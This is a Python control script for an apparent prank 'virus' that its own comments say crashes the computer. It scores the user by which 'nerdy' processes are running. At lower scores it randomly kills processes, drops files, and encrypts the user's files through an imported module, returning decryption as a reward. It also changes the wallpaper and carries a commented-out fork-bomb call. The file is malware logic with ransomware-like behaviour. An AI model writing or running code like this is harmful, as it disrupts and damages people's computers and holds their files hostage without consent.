from app_processes import isRunning, nerdyProcessPoints, terminateRandNerdProcess
from addRandomGrassFiles import main as randGrassFileMain
from change_wallpaper import change_wallpaper
from fork_bomb_window import fork_bomb_window
from initial_pop_up_window import initial_pop_up_run
from lawnmower import main as lawnmowerMain
from encrypted import main as encryptedMain, decryptAll
import random
import time
import os
#import keyboard

#Showerpoints related constants

STARTINGSP = 180
IDLESPDEC = 0.25
SHUTDOWNSP = 0

LAWNMOWERSP = 140
DECRYPTSP = 160

SPLVLS = [float('inf'), 120, 90, 60, 30, SHUTDOWNSP] #In order to be at level n you must have shower points between the values n-1 and n.
## The final lvl is unreachable since the virus crashes your computer then , and only is there so SPLVLS[currLvl+1] is always defined
SPPROBS = [30, 20, 15, 7, 1] #n represents probability 1 in n
SPWARNINGS = ["How about you take a break",
"You've been staring at this screen for ages, give your eyes a rest",
"",
""]






showerPoints = STARTINGSP
currLvl = 0 #Level n corresponds to values in (n-1)th index of array, 4 possible levels
events = [terminateRandNerdProcess, randGrassFileMain, encryptedMain]


def adjustLevel():
    global currLvl
    global showerPoints
    global SPLVLS
    while not (showerPoints <= SPLVLS[currLvl] and showerPoints > SPLVLS[currLvl+1]) :
        #If points are above current levels upper bound and the current level isn't zero lower the level
        if currLvl != 0:
            if showerPoints > SPLVLS[currLvl]:
                currLvl -= 1
        #If points are below current level's lower bound increase the level
        if showerPoints <= SPLVLS[currLvl+1]:
            currLvl += 1






#def doEvent(n):

def randomEvent():
    global showerPoints
    if currLvl > 0:
        prob = SPPROBS[currLvl-1]
        doEvent = random.randint(1, prob)
        if doEvent == 1:
            event = random.randint(1, len(events))
            #TODO choose random event
            events[event-1]()


def changeShowerScale():
    global showerPoints
    showerPoints -= IDLESPDEC
    for p, v in nerdyProcessPoints.items():
        if isRunning(p):
            #print(p, v)
            showerPoints += v

def rewards():
    global showerPoints
    global STARTINGSP

    if showerPoints >= LAWNMOWERSP:
        if (os.path.isfile(os.getcwd()+"/"+"lawnmower.txt")):
            lawnmowerMain()
    if showerPoints >= DECRYPTSP:
        if (os.path.isfile(os.getcwd()+"/"+"encryptedLocation.txt")):
            decryptAll()







change_wallpaper()
initial_pop_up_run()

randomEvent()
while True:
    changeShowerScale()
    if (showerPoints > STARTINGSP) : showerPoints = STARTINGSP
    if (showerPoints <= SHUTDOWNSP):
        #fork_bomb_window()
        break

    rewards()


    adjustLevel()



    print(showerPoints)
    print(currLvl)

    time.sleep(1)
